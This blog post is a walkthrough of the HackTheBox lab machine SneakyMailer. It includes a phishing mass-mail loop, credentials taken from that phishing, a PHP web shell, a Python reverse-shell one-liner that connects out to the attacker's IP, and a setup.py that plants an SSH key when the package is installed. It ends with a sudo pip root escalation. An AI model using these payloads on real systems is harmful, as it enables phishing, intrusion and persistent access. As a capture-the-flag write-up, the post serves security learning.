---
layout: post
title: HackTheBox SneakyMailer walkthrough
gh-repo: c00rni/c00rni.github.io
gh-badge: [star, fork, follow]
tags: [enumeration, hackthebox, ssh, pypi, smtp, linux]
comments: true
---


SneakyMailer is a HackTheBox machine with the ip address 10.10.10.197. It's a Linux machine rated as medium by the community. As you probably already guessed this box, has something to do with mail. I enumerate and created a custom script to get a foothold on the machine. The server runs a Pypi server which allowed me to get a user account and the privilege escalation was pretty straight forward because the user can execute some vulnerable commands as root.

![info_card.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/7868506449fe4aaa86c8dfddc6a0e7df.png)

Like always I start by port scanning.

![full_tcp_scan.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/92c4f703790b407faac306b319296997.png)



![detail_tcp_scan.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/58ac54cc881f4a5bb52686c167eaeb2c.png)

According to the scans the box is  highly likely to be a Debian machine. Several ports were opened. I started to enumerate the webservers for low-hanging fruits. The principal webserver (`10.10.10.197:80`) redirect to `http://sneakycorp.htb`. I modified my hosts.txt file so my operation system doesn't have to request a DNS for the domain name resolution.



![hostsV1.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/884f96a52e314b2f8e8093fc1004f100.png)


After going to the website (http://sneakycorp.htb) I found the names, and email addresses of some of the employees.


![team_webpage.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/a43946231f9b47ceb2b907dab108c9c8.png)

I Created a wordlist of all the emails with common command lines tools. This task could also have been done with [cewl](https://tools.kali.org/password-attacks/cewl)


```bash
curl http://sneakycorp.htb/team.php -o sneakymailer_page.txt
cat sneakymailer_page.txt | grep -i "sneakymailer.htb</td>" | cut -d'>' -f2 | sed -e 's/<\/td//' > employee_email_list.txt
```

From there I spent a lot of time enumerating the website and other running services for information. Didn't find anything which could lead to a remote code execution so I tried to interact with the users. I sent a mail to all users with an embedded link, and pray for someone clicks on it.

```bash
cat mail_list.txt | while read mail;do swaks --server 10.10.10.197 --to $mail --from evil@sneakymailer.htb --header "Error with your login" --body "Hello, please check this website http://10.10.14.9:8000";done
```

![mail_response.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/8b58fa1e11f74b4fb3cb8aa92d3c71d5.png)

The data from the response of the user was urlencode but it can be easily decode with online tools. I past the parameters in a burp suite panel and get the credentials with the `CRTL+SHIFT+U` shortcut.

```plaintext
firstName=Paul
lastName=Byrd
email=paulbyrd@sneakymailer.htb
password=^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht
rpassword=^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht
```

To connect to the database and see the emails of the user I used evolution wich is a email client. Paul has sent 2 mails. The first one asked `low` user to intall and test pakages through pypi and the second exposed `developer` user credentials.


![password_reset_mail.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/9bb834cf2b324cce84e14d77378c9161.png)


I failed to SSH with `developer:m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C` credentials but successfully logged into FTP. The developer has access to `dev` directory and could upload php files. I modified my hosts file again and add the subdomain `dev.sneeakycorp`.



![hostsV2.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/d72cde4d60e14d1ca7081b25c22c0336.png)

Created a PHP script which took one parameter and executed the content as a command line.
```php
# Content of 'shell.php'
<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
```
Uploaded `shell.php` with FTP, opened a port for incoming connection and got a shell with the exploit below. Replace the Xs by your ip address.

```plaintext
http://dev.sneakycorp.htb/shell.php?cmd=/usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("X.X.X.X",9002));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```



![foothold_shell.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/3547417d933749f0ad9fef5ed7b674e5.png)


Now that I was `www-data` user, I started to enumerate the machine and got the subdomain `pypi.sneakycorp.htb`. I modified  my hosts file again to access the new subdomain but didn't get anything because I was redirected to sneakycorp.htb. I remembered from the beginning of the enumeration that the server had 2 webservers running. The second one running on port 8080.


![pypi_subdomaine.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/4904889adcc4483d8ebc5890b739f80d.png)


From there I knew how to get access to higher privileged accounts. I knew from previous enumerations that `pypi` was the user who runs pypiserver and `low` user was running the python installation module .


![ps_result.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/2c1acf17a2a74add9cc75bc33fbffab4.png)

The root directory of www-data contained a `.htpasswd` file. I found the clair text of the hash with john.


![pypi_creds.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/def382be16f54c4381dedcace2956941.png)


Now I had everything except the package to upload. The python community has a very good [documentation](https://packaging.python.org/tutorials/packaging-projects/) to create packages. But you can follow the step below.
```bash
cd /var/tmp
mkdir -p mypkg/mypkg
cd mypkg
touch README.md
touch mypkg/__init__.py
echo "[metadata]
description-file = README.md" > setup.cfg
echo '[distutils]
index-servers =
  local

[local]
repository: http://127.0.0.1:5000/
username: pypi                  #Creds found in .htpasswd
password: soufianeelhaoui
' > .pypirc
chmod 777 setup.py
chmod 600 .pypirc
export HOME=$(pwd)    #.pypirc must be in the home directory to work
```

We know the installation module will be executed with low user rights. One of the ways to exploit this vulnerability is to put arbitrary commands in `setup.py` file to authorize a new ssh key. I created a pair of ssh key on my machine and put the public key in `setup.py`.



![generate_ssh_keys.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/59208d506be5461abcfc16d23a461fa1.png)


Created `setup.py` on the server in the same directory as `.pypirc` and executed it.
```bash
echo "try:
    with open('/home/low/.ssh/authorized_keys', 'a') as file:
        file.write('ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDBm/Ze8yCgr0Wco2WVlTN4fcwtpI28BGvgpal3Cv4YFwXFF+GGInx/PXwSrgQuw5yIimc/RnUF/36ABrHJXX1vRD59qXGRk3kV5bPJqI+BlEUqw3NoUYQNAPkok+sze/WJcQGIRuU3ffjsfJfyqfAdxWUrRq3z9RlLR6e4/Sh/15x+bzX/CxlVEEVZGTt3ZT8TqIeAR86+/iiz0S0+AvKperCP6NJIzPFTA4lrqzufrR0lDftfPQ4qGvaYHYW+FaW8OW0bMywUK5sSUYptIEQH2lifhhUxnIyz7Zvy6K/Jf8jF/r/rWmSn8DNgL9yl8kNlvzLSMdCUqKND5zJPthBQ68e5l04SMK7ydTrbzg1GDmSaVE7tu77T4rVAGTrl4JePnsJ0+MlHF/UG4rVv1hTsNni0uNkfEK103AChc0X5bYZexvUH3qCRiMF+ybgGcPEojDkllPyahEbkt5tV5GNeIflG9BT1EZ1p679HIr2nAsTyenOh3D97mM5ziECkLgc= kali@kali')
    print('SSH key saved.')
except Exception as e:
    pass
import setuptools

setuptools.setup(
    name='Corni', 
    version='0.0.1',
    author='Antony gandonou migan',
    author_email='author@example.com',
    description='A small example package',
    packages=setuptools.find_packages(),
    classifiers=[
        'Programming Language :: Python :: 3',
        'License :: OSI Approved :: MIT License',
        'Operating System :: OS Independent',
    ],
    python_requires='>=3.6',
)
" > setup.py
python3 setup.py sdist register -r local upload -r local
```

Used my private key with ssh and logged as low.

![low_sell.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/840842eb48374a1a8bbb40408619d8cf.png)

The first thing I did after I got low user were to check if I got sudoers rights.

![sudo_right.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/37f1f2d3043f48508601778871f9049e.png)

Run in a privilege context pip can be used to access the file system, escalate users privileges (see [GTFObins](https://gtfobins.github.io/gtfobins/pip/#sudo)).

```bash
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo pip3 install $TF
```



![root_sell.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/fd94916a739340d0b5ae14c6d316714f.png)


This is how I rooted SneakyMailer machine. I got stuck multiple time on this machine but learn stuff on the way. Thanks for reading this walkthrough.

# References 
- [https://diveintopython3.problemsolving.io/files.html](https://diveintopython3.problemsolving.io/files.html)
- [https://pypi.org/project/pypiserver/#uploading-packages-remotely](https://pypi.org/project/pypiserver/#uploading-packages-remotely)
- [https://gtfobins.github.io/gtfobins/pip/#sudo](https://gtfobins.github.io/gtfobins/pip/#sudo)
- [https://packaging.python.org/tutorials/packaging-projects/](https://packaging.python.org/tutorials/packaging-projects/)
- [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

